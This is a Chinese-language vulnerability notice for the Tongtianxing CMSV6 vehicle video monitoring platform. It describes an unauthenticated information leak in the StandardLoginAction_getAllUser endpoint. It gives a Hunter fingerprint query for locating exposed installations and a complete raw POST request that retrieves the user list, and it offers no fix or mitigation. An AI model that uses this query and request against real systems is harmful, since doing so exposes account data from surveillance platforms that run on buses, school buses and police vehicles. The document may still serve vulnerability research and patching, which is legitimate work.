# 通天星CMSV6车载视频监控平台 StandardLoginAction_getAllUser存在信息泄露漏洞

# 一、漏洞简介
通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司研发的监控平台，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。通天星科技应用于公交车车载、校车车载、大巴车车载、物流车载、油品运输车载、警车车载等公共交通视频监控，还应用在家居看护、商铺远程监控、私家车的行驶分享仪上等。通天星CMSV6车载视频监控平台 StandardLoginAction_getAllUser存在信息泄露漏洞

# 二、影响版本
+ 通天星CMSV6车载视频监控平台

# 三、资产测绘
+ hunter`web.body="./open/webApi.html"`
+ 特征

![1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4.png](./img/qeBqs1a9Qk8ZCyGE/1699407412929-42aaba13-ce63-4d08-95e9-ce71fcab3ab4-679029.png)

# 四、漏洞复现
```plain
POST /808gps/StandardLoginAction_getAllUser.action HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 9
Connection: close

json=null
```

![1708930197713-09611dea-bacf-4aef-9cb2-852e43d9b0d6.png](./img/qeBqs1a9Qk8ZCyGE/1708930197713-09611dea-bacf-4aef-9cb2-852e43d9b0d6-824541.png)

![1708930228198-70bb271e-273a-4e3f-aea0-43c58e85a92d.png](./img/qeBqs1a9Qk8ZCyGE/1708930228198-70bb271e-273a-4e3f-aea0-43c58e85a92d-631853.png)



> 更新: 2024-12-28 13:05:36  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xuidr5l1k7z3iin7>